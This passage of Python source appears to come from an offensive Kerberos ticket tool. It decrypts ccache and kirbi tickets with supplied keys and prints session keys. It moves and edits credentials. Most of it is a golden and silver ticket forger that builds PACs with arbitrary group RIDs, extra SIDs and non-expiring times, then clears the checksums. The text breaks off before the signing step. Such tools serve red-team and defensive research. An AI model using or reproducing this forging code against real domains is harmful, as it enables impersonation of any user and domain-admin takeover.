			keyType = EncryptionTypes(creds["key"]["keytype"]).name
			print("[+] KeyType = {}".format(keyType))
			print("[+] Base64(key) = {}".format(base64.b64encode(creds["key"]["keyvalue"]).decode("utf-8")))
			
			print("--------------- Unencrypted credential[%d]['ticket'] ---------------" % cred_number)
			etype = decodedTicket['ticket']['enc-part']['etype']
			print("[+] Service name = {}".format("/".join(list([str(sname_component) for sname_component in decodedTicket['ticket']['sname']['name-string']]))))
			print("[+] Service realm = {}".format(decodedTicket['ticket']['realm']))
			print("[+] Encryption type = {} (etype {})".format(EncryptionTypes(etype).name, etype))
			if not decodedTicket['ticket']['enc-part']['kvno'].isNoValue():
				print("[+] Key version number (kvno) = {}".format(decodedTicket['ticket']['enc-part']['kvno']))

			# Decrypt the encrypted TicketPart
			print("--------------- Encrypted credential[%d]['ticket']['enc-part']['cipher'] ---------------" % cred_number)
			
			decrypted = False
			decoded = False
			KEYUSAGE = 2
			
			if hexKeys == None:
				print("[-] No Kerberos Key supplied to decrypt ticket encrypted part", file = sys.stderr)
			else:
				for hexKey in hexKeys:
					try:
						cipherText = decodedTicket['ticket']['enc-part']['cipher']
						plainText, confounder = ENCTYPE_TABLE[etype].decrypt(binascii.unhexlify(hexKey), KEYUSAGE, cipherText)
						decrypted = True
						break
					except Exception as e:
						pass
				
				if not decrypted:
					print("[-] Failed to decrypt ticket encrypted part with provided Kerberos Key(s)", file = sys.stderr)
				else:
					try:
						encTicketPart = decoder.decode(plainText, asn1Spec = EncTicketPart())[0]
						decoded = True
					except Exception as e:
						print("[-] Failed to decode decrypted ticket part: {}".format(str(e)), file = sys.stderr)
					
					if decoded:
						flagsDecoded = TicketFlagsDecoder (int ("0b" + str (encTicketPart['flags']), 2))
						flags = []
						for k in TicketFlagsEnum:
							if ((flagsDecoded >> (31 - k.value)) & 1) == 1:
								flags.append(TicketFlagsEnum(k.value).name)
						sessionKey = encTicketPart['key']['keyvalue'].asOctets()
						crealm = encTicketPart['crealm']
						cname = encTicketPart['cname']['name-string'][0]
						if (len (encTicketPart['transited']['contents']) > 0):
							transited = encTicketPart['transited']['contents']
						else:
							transited = '<Empty>'
						authTime = datetime.datetime.strptime (str (encTicketPart['authtime']), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
						startTime = datetime.datetime.strptime (str (encTicketPart['starttime']), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
						endTime = datetime.datetime.strptime (str (encTicketPart['endtime']), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
						renewTill = datetime.datetime.strptime (str (encTicketPart['renew-till']), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
						if (len (encTicketPart['caddr']) > 0):
							caddr = encTicketPart['caddr'][0]['address']
						else:
							caddr = '<Empty>'
						print ("[+] Flags = ({}) {}".format (hex(flagsDecoded), ", ".join(flags)))
						print ("[+] Ticket session Key = {}".format (binascii.hexlify (sessionKey).decode()))
						print ("[+] Realm = {}".format (crealm))
						print ("[+] Client Name = {}".format (cname))
						print ("[+] Transited = {}".format (transited))
						print ("[+] UTC Authentication time = {}".format (authTime))
						print ("[+] UTC Start time = {}".format (startTime))
						print ("[+] UTC End time = {}".format (endTime))
						print ("[+] UTC End renew time = {}".format (renewTill))
						print ("[+] Client address = {}".format (caddr))

						if "authorization-data" in encTicketPart and len(encTicketPart['authorization-data']) > 0:

							try:
								print("--------------- credential[%d]['ticket']['enc-part']['cipher']['authorization-data'] ---------------" % cred_number)
								authorization_data = encTicketPart['authorization-data'][0]['ad-data'].asOctets()
								adIfRelevant = decoder.decode (authorization_data, asn1Spec = AD_IF_RELEVANT())[0]
								PAC = adIfRelevant[0]['ad-data'].asOctets()
								parsePAC(PAC, hexASRepEncKeys)
							except Exception as e:
								print("[-] Failed to decode Authorization data PAC: {}".format(str(e)), file = sys.stderr)

						else:
							print("[+] Authorization data = <Empty>")

			cred_number += 1
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def extractCredential(credToExtract, ticketFrom, ticketTo):
	print_yellow("[*] Extracting credential of Ticket1 to Ticket2")
	print_yellow("---")
	print()

	try:
		if isKirbiFile(ticketFrom):
			ccache = CCache.loadKirbiFile(ticketFrom)
		elif isCCacheFile(ticketFrom):
			ccache = CCache.loadFile(ticketFrom)
		else:
			print(f"[-] Unknown file format '{ticketFrom}'", file = sys.stderr)
			return
		
		found = False
		sUserName = credToExtract.split('@')[0].lower()
		sServiceName = credToExtract.split('@')[1].lower()
		sServiceRealm = credToExtract.split('@')[2].lower()
		for creds in ccache.credentials:
			ccUserName = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8').lower()
			ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8').lower()
			ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8').lower()
			if sUserName == ccUserName and sServiceName == ccServiceName.lower() and sServiceRealm == ccServiceRealm.lower():
				found = True
				try:

					# Add credential to ticket and save It

					if isKirbiFile(ticketTo):
						ccache2 = CCache.loadKirbiFile(ticketTo)
					elif isCCacheFile(ticketTo):
						ccache2 = CCache.loadFile(ticketTo)
					else:
						print(f"[-] Unknown file format '{ticketTo}'", file = sys.stderr)
						return

					ccache2.credentials += [creds]
					ccache2.saveFile(ticketTo)
					print(f"[+] Credential '{credToExtract}' added to '{ticketTo}'")

				except Exception as e:

					# Create the CCACHE

					data = ccache.MiniHeader().getData()
					for header in ccache.headers:
						data += header.getData()
					data += ccache.principal.getData()
					data += creds.getData()
					ccache2 = CCache(data)
					ccache2.saveFile(ticketTo)
					print(f"[+] Credential '{credToExtract}' added to '{ticketTo}'")

				break

		if not found:
			print(f"[-] Credential '{credToExtract}' not found in '{ticketFrom}'", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def dateStrUTCToTimestamp(dateStr):
	dateObj = datetime.datetime.strptime(dateStr, "%d/%m/%Y %H:%M:%S %p").replace(tzinfo = datetime.timezone.utc)
	timestamp = int(dateObj.timestamp())
	
	return timestamp

def editCredFile(inf, outf, userPrincipal, credUserPrincipal, credServicePrincipal, ticketServicePrincipal, credStartTime, credEndTime, credRenewTill, credFlags):
	print_yellow("[*] Editing credential file")
	print_yellow("---")
	print()

	try:
		saveAsKirbi = False
		if isKirbiFile(inf):
			ccache = CCache.loadKirbiFile(inf)
			saveAsKirbi = True
		elif isCCacheFile(inf):
			ccache = CCache.loadFile(inf)
		else:
			print("[-] Unknown file format", file = sys.stderr)
			return
		
		print(f"[+] Editing credential file '{inf}' to '{outf}'")
	
		# Editing the principal
		if userPrincipal != None:
			principal = Principal()
			principalObj = PrincipalObj(userPrincipal)
			principal.fromPrincipal(principalObj)
			ccache.principal = principal
			
		for x in range(len(ccache.credentials)):
			creds = ccache.credentials[x]

			# Same structure as ASREP. Thus using one of both is the same
			rawTicket = creds.toTGSREP()
			decodedTicket = decoder.decode(rawTicket['KDC_REP'], asn1Spec = TGS_REP())[0]
		
			# Editing the credential
			if credUserPrincipal != None:
				principal = Principal()
				principalObj = PrincipalObj(credUserPrincipal)
				principal.fromPrincipal(principalObj)
				creds['client'] = principal

			if credServicePrincipal != None:
				principal = Principal()
				principalObj = PrincipalObj(credServicePrincipal)
				principal.fromPrincipal(principalObj)
				creds['server'] = principal

			if credStartTime != None:
				creds['time']['starttime'] = dateStrUTCToTimestamp(credStartTime)
			if credEndTime != None:
				creds['time']['endtime'] = dateStrUTCToTimestamp(credEndTime)
			if credRenewTill != None:
				creds['time']['renew_till'] = dateStrUTCToTimestamp(credRenewTill)

			if credFlags != None:
				val = 0
				flagsArray = credFlags.split(",")
				for flag in flagsArray:
					val += 1 << (31 - TicketFlagsEnum[flag].value)
				creds['tktflags'] = val

			# Editing the ticket
			if ticketServicePrincipal != None:
				decodedTicket['ticket']['sname']['name-string'][0] = ticketServicePrincipal.split("@")[0].split("/")[0]
				decodedTicket['ticket']['sname']['name-string'][1] = ticketServicePrincipal.split("@")[0].split("/")[1]
				decodedTicket['ticket']['realm'] = ticketServicePrincipal.split("@")[1]
				creds.ticket = CountedOctetString()
				creds.ticket['data'] = encoder.encode(decodedTicket['ticket'].clone(tagSet = Ticket.tagSet, cloneValueFlag = True))
				creds.ticket['length'] = len(creds.ticket['data'])
				ccache.credentials[x] = creds

		if saveAsKirbi:
			ccache.saveKirbiFile(outf)
			print("[+] Done")
		else:
			ccache.saveFile(outf)
			print("[+] Done")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

######################
### Forging ticket ###
######################

def getFileTime(t):
	t *= 10000000
	t += 116444736000000000
	return t

def getPadLength(data_length):
		return ((data_length + 7) // 8 * 8) - data_length

def getBlockLength(data_length):
		return (data_length + 7) // 8 * 8

def createUpnDnsPac(username, domain, domainSID, userRID, pacInfos):
	upnDnsInfo = UPN_DNS_INFO_FULL()

	PAC_pad = b'\x00' * getPadLength(len(upnDnsInfo))
	upn_data = f"{username.lower()}@{domain.lower()}".encode("utf-16le")
	upnDnsInfo['UpnLength'] = len(upn_data)
	upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)
	total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']
	pad = getPadLength(total_len)
	upn_data += b'\x00' * pad

	dns_name = domain.upper().encode("utf-16le")
	upnDnsInfo['DnsDomainNameLength'] = len(dns_name)
	upnDnsInfo['DnsDomainNameOffset'] = total_len + pad
	total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']
	pad = getPadLength(total_len)
	dns_name += b'\x00' * pad

	# Enable additional data mode (Sam + SID)
	upnDnsInfo['Flags'] = 2

	samName = username.encode("utf-16le")
	upnDnsInfo['SamNameLength'] = len(samName)
	upnDnsInfo['SamNameOffset'] = total_len + pad
	total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']
	pad = getPadLength(total_len)
	samName += b'\x00' * pad

	user_sid = dtypes.SID()
	user_sid.fromCanonical(f"{domainSID}-{userRID}")
	upnDnsInfo['SidLength'] = len(user_sid)
	upnDnsInfo['SidOffset'] = total_len + pad
	total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']
	pad = getPadLength(total_len)
	user_data = user_sid.getData() + b'\x00' * pad

	# Post-PAC data
	post_pac_data = upn_data + dns_name + samName + user_data
	# Pac data building
	pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data

	return pacInfos

def createAttributesInfoPac(pacInfos):
	pacAttributes = PAC_ATTRIBUTE_INFO()
	pacAttributes["FlagsLength"] = 2
	pacAttributes["Flags"] = 1

	pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()

	return pacInfos

def createRequestorInfoPac(pacInfos, domainSID, userRID):
	pacRequestor = PAC_REQUESTOR()
	pacRequestor['UserSid'] = SID()
	pacRequestor['UserSid'].fromCanonical(f"{domainSID}-{userRID}")

	pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()

	return pacInfos

def createBasicValidationInfo(username, domain, domainSID, userRID, groups):
	# 1) KERB_VALIDATION_INFO
	kerbdata = KERB_VALIDATION_INFO()

	aTime = timegm(datetime.datetime.utcnow().timetuple())
	unixTime = getFileTime(aTime)

	kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
	kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

	# LogoffTime: A FILETIME structure that contains the time the client's logon
	# session should expire. If the session should not expire, this structure
	# SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
	# member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
	# an indicator of when to warn the user that the allowed time is due to expire.
	kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
	kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF

	# KickOffTime: A FILETIME structure that contains LogoffTime minus the user
	# account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
	# client should not be logged off, this structure SHOULD have the dwHighDateTime
	# member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
	# The Kerberos service ticket end time is a replacement for KickOffTime.
	# The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
	# an account. A recipient of the PAC SHOULD<8> use this value as the indicator
	# of when the client should be forcibly disconnected.
	kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
	kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

	kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
	kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32

	kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
	kerbdata['PasswordCanChange']['dwHighDateTime'] = 0

	# PasswordMustChange: A FILETIME structure that contains the time at which
	# theclient's password expires. If the password will not expire, this
	# structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
	# dwLowDateTime member set to 0xFFFFFFFF.
	kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
	kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

	kerbdata['EffectiveName'] = username
	kerbdata['FullName'] = ''
	kerbdata['LogonScript'] = ''
	kerbdata['ProfilePath'] = ''
	kerbdata['HomeDirectory'] = ''
	kerbdata['HomeDirectoryDrive'] = ''
	kerbdata['LogonCount'] = 500
	kerbdata['BadPasswordCount'] = 0
	kerbdata['UserId'] = int(userRID)

	# Our Golden Well-known groups
	groups = groups.split(',')
	if len(groups) == 0:
		# PrimaryGroupId must be set, default to 513 (Domain User)
		kerbdata['PrimaryGroupId'] = 513
	else:
		# Using first group as primary group
		kerbdata['PrimaryGroupId'] = int(groups[0])
	kerbdata['GroupCount'] = len(groups)

	for group in groups:
		groupMembership = samr.GROUP_MEMBERSHIP()
		groupId = dtypes.NDRULONG()
		groupId['Data'] = int(group)
		groupMembership['RelativeId'] = groupId
		groupMembership['Attributes'] = SE_GROUP_Attributes.SE_GROUP_MANDATORY.value | SE_GROUP_Attributes.SE_GROUP_ENABLED_BY_DEFAULT.value | SE_GROUP_Attributes.SE_GROUP_ENABLED.value
		kerbdata['GroupIds'].append(groupMembership)

	kerbdata['UserFlags'] = 0
	kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	kerbdata['LogonServer'] = ''
	kerbdata['LogonDomainName'] = domain.upper()
	kerbdata['LogonDomainId'].fromCanonical(domainSID)
	kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
	kerbdata['UserAccountControl'] = samr.USER_NORMAL_ACCOUNT | samr.USER_DONT_EXPIRE_PASSWORD
	kerbdata['SubAuthStatus'] = 0
	kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
	kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
	kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
	kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
	kerbdata['FailedILogonCount'] = 0
	kerbdata['Reserved3'] = 0

	kerbdata['ResourceGroupDomainSid'] = ndr.NULL
	kerbdata['ResourceGroupCount'] = 0
	kerbdata['ResourceGroupIds'] = ndr.NULL

	validationInfo = VALIDATION_INFO()
	validationInfo['Data'] = kerbdata

	return validationInfo

def createBasicPac(kdcRep, username, domain, domainSID, groups, kerbKey, userRID, extraPAC, oldPAC):
	validationInfo = createBasicValidationInfo(username, domain, domainSID, userRID, groups)
	pacInfos = {}
	pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
	srvCheckSum = PAC_SIGNATURE_DATA()
	privCheckSum = PAC_SIGNATURE_DATA()

	if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:
		srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
		privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
		srvCheckSum['Signature'] = b'\x00' * 16
		privCheckSum['Signature'] = b'\x00' * 16
	else:
		srvCheckSum['Signature'] = b'\x00' * 12
		privCheckSum['Signature'] = b'\x00' * 12
		if len(kerbKey) == 64:
			srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
			privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
		else:
			srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value
			privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value

	pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
	pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()

	clientInfo = PAC_CLIENT_INFO()
	clientInfo['Name'] = username.encode('utf-16le')
	clientInfo['NameLength'] = len(clientInfo['Name'])
	pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

	if extraPAC:
		pacInfos = createUpnDnsPac(username, domain, domainSID, userRID, pacInfos)

	if oldPAC is False:
		pacInfos = createAttributesInfoPac(pacInfos)
		pacInfos = createRequestorInfoPac(pacInfos, domainSID, userRID)

	return pacInfos

class AuthorizationDataType(Enum):
    AD_IF_RELEVANT                     = 1
    AD_INTENDED_FOR_SERVER             = 2
    AD_INTENDED_FOR_APPLICATION_CLASS  = 3
    AD_KDC_ISSUED                      = 4
    AD_AND_OR                          = 5
    AD_MANDATORY_TICKET_EXTENSIONS     = 6
    AD_IN_TICKET_EXTENSIONS            = 7
    AD_MANDATORY_FOR_KDC               = 8
    # Reserved values                  = 9-63
    OSF_DCE                            = 64
    SESAME                             = 65
    AD_OSF_DCE_PKI_CERTID              = 66 
    AD_WIN2K_PAC                       = 128 
    AD_ETYPE_NEGOTIATION               = 129 

KERB_NON_KERB_CKSUM_SALT = 17

def forgeTicket(username, domain, domainSID, hexKrbtgtSecretKey, hexServiceSecretKey, hexClientTGSSessionKey, spn, groupsRID, userRID, extraPAC, oldPAC, duration, renewDuration, extraSID):
	print_yellow("[*] Forging ticket")
	print_yellow("---")
	print()

	try:
		if (hexKrbtgtSecretKey == None and hexServiceSecretKey == None and hexClientTGSSessionKey == None) or domainSID == None:
			print("[-] Krbtgt Secret Key/Service Secret Key/Client-to-TGS Session Key and domain SID required")
			return
		else:
			if hexKrbtgtSecretKey != None:
				kerbKey = hexKrbtgtSecretKey
			elif hexServiceSecretKey != None:
				kerbKey = hexServiceSecretKey
			else:
				kerbKey = hexClientTGSSessionKey

		if spn: # Forge a ST
			spn = spn.split('/')
			service = spn[0]
			server = spn[1]
		else: # Forge a TGT
			service = 'krbtgt'
			server = domain
		
		### Creating basic skeleton ticket and PAC infos ###

		print('[+] Creating basic skeleton ticket and PAC Infos')

		if domain == server:
			kdcRep = AS_REP()
			kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
		else:
			kdcRep = TGS_REP()
			kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
		kdcRep['pvno'] = 5
		
		if len(kerbKey) != 16: # Not Encryption Type 23
			kdcRep['padata'] = noValue
			kdcRep['padata'][0] = noValue
			kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value

			etype2 = ETYPE_INFO2()
			etype2[0] = noValue
			if len(kerbKey) == 64: # Encryption Type 18
				etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
			else: # Encryption Type 17
				etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
			etype2[0]['salt'] = '%s%s' % (domain.upper(), username)
			encodedEtype2 = encoder.encode(etype2)

			kdcRep['padata'][0]['padata-value'] = encodedEtype2

		kdcRep['crealm'] = domain.upper()
		kdcRep['cname'] = noValue
		kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
		kdcRep['cname']['name-string'] = noValue
		kdcRep['cname']['name-string'][0] = username

		kdcRep['ticket'] = noValue
		kdcRep['ticket']['tkt-vno'] = 5
		kdcRep['ticket']['realm'] = domain.upper()
		kdcRep['ticket']['sname'] = noValue
		kdcRep['ticket']['sname']['name-string'] = noValue
		kdcRep['ticket']['sname']['name-string'][0] = service

		if domain == server:
			kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
			kdcRep['ticket']['sname']['name-string'][1] = domain.upper()
		else:
			kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
			kdcRep['ticket']['sname']['name-string'][1] = server

		kdcRep['ticket']['enc-part'] = noValue
		kdcRep['ticket']['enc-part']['kvno'] = 2
		kdcRep['enc-part'] = noValue
		if len(kerbKey) != 16:
			if len(kerbKey) == 64:
				kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
				kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
			else:
				kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
				kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
		else:
			kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
			kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value

		kdcRep['enc-part']['kvno'] = 2
		kdcRep['enc-part']['cipher'] = noValue

		pacInfos = createBasicPac(kdcRep, username, domain, domainSID, groupsRID, kerbKey, userRID, extraPAC, oldPAC)

		### Customizing ticket ###

		print(f'[+] Customizing ticket for {domain}/{username}')
		
		encTicketPart = EncTicketPart()

		flags = list()
		flags.append(TicketFlagsEnum.forwardable.value)
		flags.append(TicketFlagsEnum.proxiable.value)
		flags.append(TicketFlagsEnum.renewable.value)
		if domain == server:
			flags.append(TicketFlagsEnum.initial.value)
		flags.append(TicketFlagsEnum.pre_authent.value)
		encTicketPart['flags'] = encodeFlags(flags)
		encTicketPart['key'] = noValue
		encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']

		if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
			encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
		elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
			encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
		else:
			encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])

		encTicketPart['crealm'] = domain.upper()
		encTicketPart['cname'] = noValue
		encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
		encTicketPart['cname']['name-string'] = noValue
		encTicketPart['cname']['name-string'][0] = username

		encTicketPart['transited'] = noValue
		encTicketPart['transited']['tr-type'] = 0
		encTicketPart['transited']['contents'] = ''

		encTicketPart['authtime'] = KerberosTimeObj.to_asn1(datetime.datetime.utcnow())
		encTicketPart['starttime'] = KerberosTimeObj.to_asn1(datetime.datetime.utcnow())
		ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours = int(duration))
		encTicketPart['endtime'] = KerberosTimeObj.to_asn1(ticketDuration)
		ticketRenewDuration = datetime.datetime.utcnow() + datetime.timedelta(hours = int(renewDuration))
		encTicketPart['renew-till'] = KerberosTimeObj.to_asn1(ticketRenewDuration)
		encTicketPart['authorization-data'] = noValue
		encTicketPart['authorization-data'][0] = noValue
		encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
		encTicketPart['authorization-data'][0]['ad-data'] = noValue

		# Let's locate the KERB_VALIDATION_INFO and Checksums
		if PAC_LOGON_INFO in pacInfos:
			data = pacInfos[PAC_LOGON_INFO]
			validationInfo = VALIDATION_INFO()
			validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
			lenVal = len(validationInfo.getData())
			validationInfo.fromStringReferents(data, lenVal)

			aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))

			unixTime = getFileTime(aTime)

			kerbdata = KERB_VALIDATION_INFO()

			kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
			kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

			# Let's adjust username and other data
			validationInfo['Data']['LogonDomainName'] = domain.upper()
			validationInfo['Data']['EffectiveName'] = username
			# Our Golden Well-known groups
			groupsRID = groupsRID.split(',')
			validationInfo['Data']['GroupIds'] = list()
			validationInfo['Data']['GroupCount'] = len(groupsRID)

			for groupRID in groupsRID:
				groupMembership = samr.GROUP_MEMBERSHIP()
				groupId = dtypes.NDRULONG()
				groupId['Data'] = int(groupRID)
				groupMembership['RelativeId'] = groupId
				groupMembership['Attributes'] =  SE_GROUP_Attributes.SE_GROUP_MANDATORY.value | SE_GROUP_Attributes.SE_GROUP_ENABLED_BY_DEFAULT.value | SE_GROUP_Attributes.SE_GROUP_ENABLED.value
				validationInfo['Data']['GroupIds'].append(groupMembership)

			# Let's add the extraSid
			if extraSID is not None:
				extrasids = extraSID.split(',')
				if validationInfo['Data']['SidCount'] == 0:
					# Let's be sure user's flag specify we have extra sids.
					validationInfo['Data']['UserFlags'] |= 0x20
					validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
				for extrasid in extrasids:
					validationInfo['Data']['SidCount'] += 1

					sidRecord = KERB_SID_AND_ATTRIBUTES()

					sid = RPC_SID()
					sid.fromCanonical(extrasid)

					sidRecord['Sid'] = sid
					sidRecord['Attributes'] = SE_GROUP_Attributes.SE_GROUP_MANDATORY.value | SE_GROUP_Attributes.SE_GROUP_ENABLED_BY_DEFAULT.value | SE_GROUP_Attributes.SE_GROUP_ENABLED.value

					# And, let's append the magicSid
					validationInfo['Data']['ExtraSids'].append(sidRecord)
			else:
				validationInfo['Data']['ExtraSids'] = ndr.NULL

			validationInfoBlob  = validationInfo.getData() + validationInfo.getDataReferents()
			pacInfos[PAC_LOGON_INFO] = validationInfoBlob
		else:
			raise Exception('PAC_LOGON_INFO not found! Aborting')

		# Let's now clear the checksums
		if PAC_SERVER_CHECKSUM in pacInfos:
			serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
			if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
				serverChecksum['Signature'] = '\x00' * 12
			elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
				serverChecksum['Signature'] = '\x00' * 12
			else:
				serverChecksum['Signature'] = '\x00' * 16
			pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
		else:
			raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')

		if PAC_PRIVSVR_CHECKSUM in pacInfos:
			privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
			privSvrChecksum['Signature'] = '\x00' * 12
			if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
				privSvrChecksum['Signature'] = '\x00' * 12
			elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
				privSvrChecksum['Signature'] = '\x00' * 12
			else:
				privSvrChecksum['Signature'] = '\x00' * 16
			pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
		else:
			raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')

		if PAC_CLIENT_INFO_TYPE in pacInfos:
			pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
			pacClientInfo['ClientId'] = unixTime
			pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
		else:
			raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')

		if domain == server:
			encRepPart = EncASRepPart()
		else:
			encRepPart = EncTGSRepPart()

		encRepPart['key'] = noValue
		encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
		encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
		encRepPart['last-req'] = noValue
		encRepPart['last-req'][0] = noValue
		encRepPart['last-req'][0]['lr-type'] = 0
		encRepPart['last-req'][0]['lr-value'] = KerberosTimeObj.to_asn1(datetime.datetime.utcnow())
		encRepPart['nonce'] = 123456789
		encRepPart['key-expiration'] = KerberosTimeObj.to_asn1(ticketDuration)
		encRepPart['flags'] = encodeFlags(flags)
		encRepPart['authtime'] = str(encTicketPart['authtime'])
		encRepPart['endtime'] = str(encTicketPart['endtime'])
		encRepPart['starttime'] = str(encTicketPart['starttime'])
		encRepPart['renew-till'] = str(encTicketPart['renew-till'])
		encRepPart['srealm'] = domain.upper()
		encRepPart['sname'] = noValue
		encRepPart['sname']['name-string'] = noValue
		encRepPart['sname']['name-string'][0] = service

		if domain == server:
			encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
			encRepPart['sname']['name-string'][1] = domain.upper()
		else:
			encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
			encRepPart['sname']['name-string'][1] = server

		encASorTGSRepPart = encRepPart

		### Signing/Encrypting final ticket ###

		print('[+] Signing/Encrypting final ticket')

		# Basic PAC count
		pac_count = 4

		# We changed everything we needed. Now let's repack and calculate checksums
